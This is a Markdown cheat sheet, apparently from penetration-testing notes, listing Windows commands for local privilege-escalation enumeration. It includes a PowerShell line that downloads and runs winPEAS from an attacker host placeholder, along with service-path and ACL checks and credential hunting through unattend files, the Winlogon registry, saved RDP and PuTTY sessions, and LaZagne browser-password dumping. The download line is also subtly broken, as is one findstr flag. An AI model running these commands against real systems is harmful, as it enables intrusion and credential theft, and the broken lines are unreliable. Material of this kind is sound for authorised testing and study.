---
title: Windows Local Enumeration
category: privesc-windows
description: Discover users, services, patches, creds-in-files.
tags: [windows, privesc, enumeration]
os: [windows]
order: 5
---

## Auto-enum

```powershell
# winPEAS
iex (iwr -uri 'http://{{LHOST}}/winPEASx64.exe' -UseBasicParsing)
# PowerUp
. .\PowerUp.ps1 ; Invoke-AllChecks
# Seatbelt
.\Seatbelt.exe -group=all
# WES-NG (offline) — pipe systeminfo
systeminfo > si.txt
```

## System & users

```cmd
systeminfo
whoami /all
whoami /priv
whoami /groups
net user
net user {{USER}}
net localgroup
net localgroup administrators
hostname
wmic qfe get HotFixID,InstalledOn /format:csv      :: patches
```

## Network

```cmd
ipconfig /all
route print
arp -a
netstat -ano
netsh advfirewall show allprofiles
```

## Services & processes

```powershell
Get-Service | ? {$_.Status -eq 'Running'}
Get-CimInstance Win32_Service | select Name,PathName,StartName,State |
  Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'}    # unquoted paths
tasklist /v /fo csv
Get-Process -IncludeUserName | Select Name,Id,UserName,Path
```

## ACL checks (PowerUp-style)

```powershell
# Unquoted service paths
Get-UnquotedService
# Modifiable service binary
Get-ModifiableServiceFile
# Modifiable service config
Get-ModifiableService
# AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated
# Modifiable scheduled task
Get-ModifiableScheduledTaskFile
```

## Credentials in files

```cmd
findstr /si password *.txt *.ini *.config *.xml
findstr /si "password" C:\unattend.xml C:\Windows\Panther\Unattend.xml
findstr /si /spin "password" *.*
type C:\Windows\System32\drivers\etc\hosts
type C:\Windows\debug\NetSetup.log
```

```powershell
# Saved RDP creds
cmdkey /list
# Stored sessions
Get-ChildItem HKCU:\Software\SimonTatham\PuTTY\Sessions -EA SilentlyContinue
# Browsers via SharpChrome / LaZagne
LaZagne.exe all
```

## Scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

## Registry crumbs

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
